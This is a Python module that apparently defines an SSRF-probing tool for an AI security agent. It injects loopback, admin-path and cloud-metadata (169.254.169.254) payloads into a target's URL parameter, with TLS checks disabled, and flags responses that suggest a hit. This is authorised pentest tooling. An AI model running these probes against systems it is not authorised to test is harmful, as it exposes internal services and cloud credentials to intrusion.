from __future__ import annotations

import json
from dataclasses import dataclass
from typing import Dict, List, Optional
from urllib.parse import urlencode, urlsplit, urlunsplit

import requests

from cai.sdk.agents import function_tool


@dataclass
class ProbeResult:
    payload: str
    status_code: Optional[int]
    elapsed_ms: int
    reflected: bool
    error: Optional[str] = None


def _inject_param(url: str, key: str, value: str) -> str:
    parts = list(urlsplit(url))
    query = parts[3]
    params = {}
    if query:
        for pair in query.split("&"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                params[k] = v
    params[key] = value
    parts[3] = urlencode(params)
    return urlunsplit(parts)


def _default_payloads(callback_url: str) -> List[str]:
    payloads = [
        "http://127.0.0.1:80",
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost/admin",
        "http://[::1]/",
    ]
    if callback_url:
        payloads.append(callback_url)
    return payloads


@function_tool(strict_mode=False)
def ssrf_probe(
    target_url: str,
    parameter_name: str = "url",
    method: str = "GET",
    callback_url: str = "",
    timeout_sec: int = 8,
    headers: Optional[Dict[str, str]] = None,
) -> str:
    """
    Probe SSRF primitives using deterministic payload sets.
    """
    payloads = _default_payloads(callback_url)
    results: List[ProbeResult] = []

    for payload in payloads:
        probe_url = _inject_param(target_url, parameter_name, payload)
        try:
            response = requests.request(
                method=method.upper(),
                url=probe_url,
                headers=headers or {},
                timeout=timeout_sec,
                allow_redirects=False,
                verify=False,
            )
            body = response.text[:3000] if response.text else ""
            results.append(
                ProbeResult(
                    payload=payload,
                    status_code=response.status_code,
                    elapsed_ms=int(response.elapsed.total_seconds() * 1000),
                    reflected=(payload in body),
                )
            )
        except Exception as exc:  # pylint: disable=broad-except
            results.append(
                ProbeResult(
                    payload=payload,
                    status_code=None,
                    elapsed_ms=0,
                    reflected=False,
                    error=str(exc),
                )
            )

    suspicious = [
        r
        for r in results
        if (r.status_code is not None and r.status_code < 500 and r.reflected)
        or ("169.254.169.254" in r.payload and r.status_code in (200, 301, 302, 307, 308))
    ]

    output = {
        "target_url": target_url,
        "parameter_name": parameter_name,
        "callback_url": callback_url or None,
        "results": [r.__dict__ for r in results],
        "candidate_hits": [r.__dict__ for r in suspicious],
        "confidence": "high" if suspicious else "low",
        "next_steps": [
            "Use poll_oast_callbacks with the same token if callback_url was used.",
            "Try alternate parameters (next, redirect, dest, image, feed, webhook).",
        ],
    }
    return json.dumps(output, ensure_ascii=True)

